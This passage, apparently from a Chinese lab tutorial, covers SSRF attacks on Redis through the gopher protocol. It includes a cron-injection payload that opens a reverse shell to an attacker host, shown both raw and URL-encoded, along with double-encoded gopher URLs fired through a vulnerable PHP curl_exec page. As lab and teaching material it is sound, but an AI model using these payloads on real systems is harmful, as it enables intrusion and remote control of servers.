&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;set&lt;&#x2F;span&gt;&lt;span&gt; 1 &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;\n\n\n\n* * * * * root bash -i &amp;gt;&amp;amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.31.73&#x2F;10000 0&amp;gt;&amp;amp;1\n\n\n\n&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;config&lt;&#x2F;span&gt;&lt;span&gt; set dir &#x2F;etc&#x2F;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;config&lt;&#x2F;span&gt;&lt;span&gt; set dbfilename crontab
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;save
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;我们将其进行URL编码&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;http&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-http &quot;&gt;&lt;code class=&quot;language-http&quot; data-lang=&quot;http&quot;&gt;&lt;span&gt;http:&#x2F;&#x2F;172.18.0.2:6379&#x2F;
&lt;&#x2F;span&gt;&lt;span&gt;test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.31.73%2F10000%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;其中172.18.0.2:6379是目标主机&lt;br &#x2F;&gt;通过burp构造发送包，点击send&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624741724489-e62348de-f886-4599-98b2-22b4a68dc15f.png#align=left&amp;amp;display=inline&amp;amp;height=983&amp;amp;id=u29f9a91d&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=Snipaste_2021-06-27_05-08-28.png&amp;amp;originHeight=983&amp;amp;originWidth=1694&amp;amp;size=186418&amp;amp;status=done&amp;amp;style=none&amp;amp;width=1694&quot; alt=&quot;Snipaste_2021-06-27_05-08-28.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;回复包说明服务器已经收到了我们的请求&lt;br &#x2F;&gt;这时候我们再回到kali主机，发现已经得到了shell&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624741843784-99ed8c1d-5005-46d8-945e-b3933bcc6ed7.png#align=left&amp;amp;display=inline&amp;amp;height=241&amp;amp;id=u2af3d5c0&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=Snipaste_2021-06-27_05-10-08.png&amp;amp;originHeight=241&amp;amp;originWidth=597&amp;amp;size=13175&amp;amp;status=done&amp;amp;style=none&amp;amp;width=597&quot; alt=&quot;Snipaste_2021-06-27_05-10-08.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;ssrflou-dong-shen-tou-redis&quot;&gt;SSRF漏洞渗透Redis&lt;&#x2F;h2&gt;
&lt;h3 id=&quot;redisding-yi&quot;&gt;Redis定义&lt;&#x2F;h3&gt;
&lt;p&gt;REmote DIctionary Server(Redis) 是一个由Salvatore Sanfilippo写的key-value存储系统。&lt;br &#x2F;&gt;Redis是一个开源的使用ANSI C语言编写、遵守BSD协议、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。&lt;br &#x2F;&gt;它通常被称为数据结构服务器，因为值（value）可以是 字符串(String), 哈希(Hash), 列表(list), 集合(sets) 和 有序集合(sorted sets)等类型。 ----摘自&lt;a href=&quot;https:&#x2F;&#x2F;link.zhihu.com&#x2F;?target=https%3A&#x2F;&#x2F;www.runoob.com&#x2F;redis&#x2F;redis-tutorial.html&quot;&gt;runoob&lt;&#x2F;a&gt;&lt;br &#x2F;&gt;redis是一种非关系型数据库，nosql&lt;&#x2F;p&gt;
&lt;h3 id=&quot;redisan-zhuang&quot;&gt;Redis安装&lt;&#x2F;h3&gt;
&lt;ol&gt;
&lt;li&gt;安装redis&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;apt-get&lt;&#x2F;span&gt;&lt;span&gt; install redis-server
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;修改redis监听IP(如果不修改，不可远程登录)，IP需要替换为自己的IP&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;vim&lt;&#x2F;span&gt;&lt;span&gt; &#x2F;etc&#x2F;redis&#x2F;redis.conf
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# 修改为以下内容
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;bind&lt;&#x2F;span&gt;&lt;span&gt; 127.0.0.1 192.168.0.67
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ol start=&quot;3&quot;&gt;
&lt;li&gt;启动redis服务&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;service&lt;&#x2F;span&gt;&lt;span&gt; redis-server start
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;0x01-redisru-qin-fan-dan-shell&quot;&gt;0x01 Redis入侵，反弹shell&lt;&#x2F;h3&gt;
&lt;p&gt;在开始讲攻击Redis之前，必须要理解Redis的客户端和服务端的通信方式，以及数据发送的格式，该目的的实现需要tcpdump的抓包功能。使用抓包软件来查看Redis客户端和Redis服务端的通信数据，找到语法结构后开始模拟客户端发送数据。&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624805501488-ee361262-e46a-4c8d-9ced-1d417cc73770.png#align=left&amp;amp;display=inline&amp;amp;height=982&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=982&amp;amp;originWidth=2446&amp;amp;size=598905&amp;amp;status=done&amp;amp;style=none&amp;amp;width=2446&quot; alt=&quot;image.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;使用tcpdump来完成抓包，命令如下：&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;tcpdump -i&lt;&#x2F;span&gt;&lt;span&gt; eth0 port 6379&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -w&lt;&#x2F;span&gt;&lt;span&gt; redis.pcap
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;参数说明如下：（更多tcpdump的教程，参考[Tcpdump教程]&lt;&#x2F;span&gt;&lt;span&gt;(https:&#x2F;&#x2F;www.runoob.com&#x2F;linux&#x2F;linux-comm-tcpdump.html)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;）
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;-i：指定网卡为eth0
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;port：指定抓哪个端口的数据
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;-w：将流量包保存为文件
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;使用Redis客户端登录Redis服务端，命令如下(默认无密码)：&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;root@Kali-2018:~&#x2F;tmp#&lt;&#x2F;span&gt;&lt;span&gt; redis-cli&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -h&lt;&#x2F;span&gt;&lt;span&gt; 192.168.0.119&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -p&lt;&#x2F;span&gt;&lt;span&gt; 6379
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;192.168.0.119:6379&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt; get a
&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;nil&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;192.168.0.119:6379&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;以上命令做了一个获取a对应的值是多少的操作，现在我们使用wireshark看一下抓到的包(使用追踪流-TCP流)：&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;上面非常多的内容就不放了
&lt;&#x2F;span&gt;&lt;span&gt;*2
&lt;&#x2F;span&gt;&lt;span&gt;$3
&lt;&#x2F;span&gt;&lt;span&gt;get
&lt;&#x2F;span&gt;&lt;span&gt;$1
&lt;&#x2F;span&gt;&lt;span&gt;a
&lt;&#x2F;span&gt;&lt;span&gt;-1
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;如果不理解Redis的数据发送的数据包格式，是看不懂上面内容的，这里必须要讲这么几个内容：&lt;br &#x2F;&gt;&lt;strong&gt;2.1、序列化协议&lt;&#x2F;strong&gt;：客户端-服务端之间交互的是序列化后的协议数据。在Redis中，协议数据分为不同的类型，每种类型的数据均以CRLF（\r\n）结束，通过数据的首字符区分类型。&lt;br &#x2F;&gt;&lt;strong&gt;2.2、inline command&lt;&#x2F;strong&gt;：这类数据表示Redis命令，首字符为Redis命令的字符，格式为 str1 str2 str3 …。如：exists key1，命令和参数以空格分隔。&lt;br &#x2F;&gt;&lt;strong&gt;2.3、simple string&lt;&#x2F;strong&gt;：首字符为&#x27;+&#x27;，后续字符为string的内容，且该string 不能包含&#x27;\r&#x27;或者&#x27;\n&#x27;两个字符，最后以&#x27;\r\n&#x27;结束。如：&#x27;+OK\r\n&#x27;，表示”OK”，这个string数据。&lt;br &#x2F;&gt;&lt;strong&gt;2.4、bulk string&lt;&#x2F;strong&gt;：bulk string 首字符为&#x27;$&#x27;，紧跟着的是string数据的长度，&#x27;\r\n&#x27;后面是内容本身（包含’\r’、’\n’等特殊字符），最后以&#x27;\r\n&#x27;结束。如：&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;&amp;quot;$12\r\nhello\r\nworld\r\n&amp;quot;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;上面字节串描述了 “hello\r\nworld” 的内容（中间有个换行）。对于&amp;quot; &amp;quot;空串和null，通过&#x27;$&#x27; 之后的数字进行区分：&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;&amp;quot;$0\r\n\r\n&amp;quot; 表示空串；
&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;$-1\r\n&amp;quot; 表示null。
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;strong&gt;2.5、integer&lt;&#x2F;strong&gt;：以 &#x27;:&#x27; 开头，后面跟着整型内容，最后以&#x27;\r\n&#x27;结尾。如：&amp;quot;:13\r\n&amp;quot;，表示13的整数。&lt;br &#x2F;&gt;&lt;strong&gt;2.6、array&lt;&#x2F;strong&gt;：以&#x27;*&#x27;开头，紧跟着数组的长度，&amp;quot;\r\n&amp;quot; 之后是每个元素的序列化数据。如：&amp;quot;&lt;em&gt;2\r\n+abc\r\n:9\r\n&amp;quot; 表示一个长度为2的数组：[&amp;quot;abc&amp;quot;, 9]。数组长度为0或 -1分别表示空数组或 null。&lt;br &#x2F;&gt;数组的元素本身也可以是数组，多级数组是树状结构，采用先序遍历的方式序列化。如：[[1, 2], [&amp;quot;abc&amp;quot;]]，序列化为：&amp;quot;&lt;em&gt;2\r\n&lt;&#x2F;em&gt;2\r\n:1\r\n:2\r\n&lt;&#x2F;em&gt;1\r\n+abc\r\n&amp;quot;。&lt;&#x2F;p&gt;
&lt;ol start=&quot;3&quot;&gt;
&lt;li&gt;经过上面内容的讲解，在回过头理解抓到的redis的包就很容易明白了。&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;上面非常多的内容就不放了
&lt;&#x2F;span&gt;&lt;span&gt;*2 数组长度为2
&lt;&#x2F;span&gt;&lt;span&gt;$3 bulk string，代表字符串长度为3，就是get
&lt;&#x2F;span&gt;&lt;span&gt;get 普通字符
&lt;&#x2F;span&gt;&lt;span&gt;$1 bulk string，代表字符串长度为1，就是a
&lt;&#x2F;span&gt;&lt;span&gt;a 普通字符
&lt;&#x2F;span&gt;&lt;span&gt;-1 返回内容，-1代表null
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;明白以上内容后基本就理清了思路，如果要给redis发命令，按照他的序列化规则即可。现在有一个大胆的想法，如果我用gopher去执行redis的命令呢？为了实现我们的想法，我们在Redis中加一个key，名字为name，值为Margin。命令如下：&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;set name Margin
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;此时，我们使用curl来发起gopher的请求，如下：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;curl&lt;&#x2F;span&gt;&lt;span&gt; gopher:&#x2F;&#x2F;192.168.0.119:6379&#x2F;_*2
&lt;&#x2F;span&gt;&lt;span&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;3
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;get
&lt;&#x2F;span&gt;&lt;span&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;4
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;name
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;将其转化为url编码&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;curl&lt;&#x2F;span&gt;&lt;span&gt; gopher:&#x2F;&#x2F;192.168.0.119:6379&#x2F;_%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;a%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;32&lt;&#x2F;span&gt;&lt;span&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;d%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;a%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;24&lt;&#x2F;span&gt;&lt;span&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;33&lt;&#x2F;span&gt;&lt;span&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;d%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;a%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;67&lt;&#x2F;span&gt;&lt;span&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;65&lt;&#x2F;span&gt;&lt;span&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;74&lt;&#x2F;span&gt;&lt;span&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;d%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;a%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;24&lt;&#x2F;span&gt;&lt;span&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;34&lt;&#x2F;span&gt;&lt;span&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;d%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;a%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;6&lt;&#x2F;span&gt;&lt;span&gt;e%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;61&lt;&#x2F;span&gt;&lt;span&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;6&lt;&#x2F;span&gt;&lt;span&gt;d%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;65&lt;&#x2F;span&gt;&lt;span&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;d%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;a
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;执行结果如下&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;margine:~&lt;&#x2F;span&gt;&lt;span&gt; margin$ curl gopher:&#x2F;&#x2F;192.168.0.119:6379&#x2F;_%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;a%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;32&lt;&#x2F;span&gt;&lt;span&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;d%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;a%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;24&lt;&#x2F;span&gt;&lt;span&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;33&lt;&#x2F;span&gt;&lt;span&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;d%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;a%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;67&lt;&#x2F;span&gt;&lt;span&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;65&lt;&#x2F;span&gt;&lt;span&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;74&lt;&#x2F;span&gt;&lt;span&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;d%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;a%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;24&lt;&#x2F;span&gt;&lt;span&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;34&lt;&#x2F;span&gt;&lt;span&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;d%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;a%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;6&lt;&#x2F;span&gt;&lt;span&gt;e%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;61&lt;&#x2F;span&gt;&lt;span&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;6&lt;&#x2F;span&gt;&lt;span&gt;d%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;65&lt;&#x2F;span&gt;&lt;span&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;d%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;a
&lt;&#x2F;span&gt;&lt;span&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;6
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Margin
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;那如果是在web漏洞中呢？如何利用？经过 &lt;strong&gt;Gopher协议在SSRF漏洞中的深入研究&lt;&#x2F;strong&gt; 的内容可以很容易的联想到使用方法：&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;1、构造利用代码
&lt;&#x2F;span&gt;&lt;span&gt;2、url转码
&lt;&#x2F;span&gt;&lt;span&gt;3、再次url转码
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;web环境我们还是使用上一节课的代码（curl_exec.php），代码如下：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;php&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-php &quot;&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span style=&quot;color:#ab7967;&quot;&gt;&amp;lt;?php
&lt;&#x2F;span&gt;&lt;span&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;url &lt;&#x2F;span&gt;&lt;span&gt;= $&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;_GET&lt;&#x2F;span&gt;&lt;span&gt;[&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;url&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;];
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;echo &lt;&#x2F;span&gt;&lt;span&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;url&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#var_dump(curl_version());
&lt;&#x2F;span&gt;&lt;span&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;curlobj &lt;&#x2F;span&gt;&lt;span&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;curl_init&lt;&#x2F;span&gt;&lt;span&gt;($&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;url&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;echo curl_exec&lt;&#x2F;span&gt;&lt;span&gt;($&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;curlobj&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ab7967;&quot;&gt;?&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;最终构造利用代码为：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;http&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-http &quot;&gt;&lt;code class=&quot;language-http&quot; data-lang=&quot;http&quot;&gt;&lt;span&gt;http:&#x2F;&#x2F;192.168.0.109&#x2F;ssrf&#x2F;base&#x2F;curl_exec.php?url=gopher%3a%2f%2f192.168.0.119%3a6379%2f_%25%32%61%25%33%32%25%30%64%25%30%61%25%32%34%25%33%33%25%30%64%25%30%61%25%36%37%25%36%35%25%37%34%25%30%64%25%30%61%25%32%34%25%33%34%25%30%64%25%30%61%25%36%65%25%36%31%25%36%64%25%36%35%25%30%64%25%30%61
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;但使用curl请求后一直卡顿，没有任何回显，无比绝望，我的排查思路为下：&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;1、查看web日志，是否有错误日志（发现并没有）
&lt;&#x2F;span&gt;&lt;span&gt;2、在执行curl_exe函数前，加上exit()函数，这样我便能判断http请求是否到后台代码了（结果可以）
&lt;&#x2F;span&gt;&lt;span&gt;3、查看redis的命令执行记录（接下来讲这个）
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;在Linux命令行中执行以下命令来查看Redis命令执行记录：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;redis-cli -h&lt;&#x2F;span&gt;&lt;span&gt; 127.0.0.1  monitor
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
